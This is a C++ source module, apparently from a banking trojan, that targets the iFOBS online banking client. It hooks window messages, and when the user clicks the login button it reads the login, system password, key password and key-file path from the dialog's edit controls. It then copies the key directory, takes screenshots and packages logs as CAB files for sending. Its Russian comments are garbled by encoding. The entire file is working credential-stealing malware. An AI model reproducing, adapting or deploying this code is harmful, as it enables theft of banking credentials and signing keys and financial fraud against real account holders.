#include "GetApi.h"
#include "KeyLogSystems.h"
#include "Memory.h"
#include "Utils.h"
#include "Splice.h"
#include "modules.h"

#include "BotDebug.h"

namespace IFOBSCLIENT
{
	#include "DbgTemplates.h"
}

#define DBG IFOBSCLIENT::DBGOutMessage<>

namespace IFobs
{

const int PROCESS_HASH = 0x9FF6B644; /* ifobsclient.exe */
const DWORD HashClassEditControl = 0x2ED8AE2E; /* TcxCustomInnerTextEdit */
const int CountEditControl = 4;

struct ForFindEditControl
{
	char* texts[CountEditControl];
	int n;
};

static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
{
	ForFindEditControl* ffec = (ForFindEditControl*)lParam;
	DWORD hash = GetWndClassHash(hwnd);
	if( hash == HashClassEditControl )
	{
		ffec->texts[ffec->n] = GetWndText(hwnd);
		DBG( "IFobs", "find control %08x, text = %s", hwnd, ffec->texts[ffec->n] );
		ffec->n++;
		if( ffec->n >= CountEditControl ) return FALSE;
	}
	return TRUE;
}

void AddStrLog( const char* name, const char* value )
{
	char buf[MAX_PATH];
	m_lstrcpy( buf, name );
	m_lstrcat( buf, ": " );
	if( value )
		m_lstrcat( buf, value );
	m_lstrcat( buf, "\r\n" );
	DBG( "IFobs", buf );
}

//� ���� ����������� 4-� ��������� ���� �����, ����� ������������ ���� �������� ���� ������� ��� ��������
//� ������� texts ��������� ForFindEditControl ��� ��������� � ��������� �������: 0 - ���� � ������, 
//1 - ������ ��� ������, 2 - ������ ��� ����� �������, 3 - �����
void GrabData( HWND wnd )
{
	DBG( "IFobs", "������ ������" );
	ForFindEditControl ffec;
	ClearStruct(ffec);
	pEnumChildWindows( wnd, EnumChildProc, &ffec );
	AddStrLog( "Login", ffec.texts[3] );
	AddStrLog( "Password system", ffec.texts[2] );
	AddStrLog( "Password key", ffec.texts[1] );
	AddStrLog( "Path keys", ffec.texts[0] );
	DWORD attr = (DWORD)pGetFileAttributesA(ffec.texts[0]);
	if( attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY) != 0 )
		KeyLogger::AddDirectory( ffec.texts[0], "Keys" );
	for( int i = 0; i < ffec.n; i++ ) STR::Free(ffec.texts[i]);
}

void OnMessage(LPVOID Sender, PMSG Msg, bool IsUnicode)
{
	if( Msg->message == WM_LBUTTONUP )
	{
		char text[64];
		GetWindowTextA( Msg->hwnd, text, sizeof(text) );
		if( m_lstrcmp( text, "�������" ) == 0 )
		{
			HWND parent = (HWND)pGetParent(Msg->hwnd);
			if( !KeyLogger::IsWindowDialog(parent) ) return;
			GrabData(parent);
		}
	}
}

void Activeted(LPVOID Sender)
{
	DBG( "IFobs", "Activated" );
	PKeyLogSystem System = (PKeyLogSystem)Sender;
}

bool Init()
{
	DBG( "IFobs", "����������� �������" );
	PKeyLogSystem S = KeyLogger::AddSystem( "ifobs", PROCESS_HASH );
	if( S != NULL )
	{
		char* caption = "*iFOBS*�����������*";
		S->MakeScreenShot = true;
		S->SendLogAsCAB = true;
		S->OnActivate = Activeted;
		//S->OnDeactivate = Deactiveted;
		S->OnMessage = OnMessage;
		
		KeyLogger::AddFilter(S, true, true, NULL, caption, FILTRATE_PARENT_WND, LOG_ALL, 5);
	}
	return true;
}

}
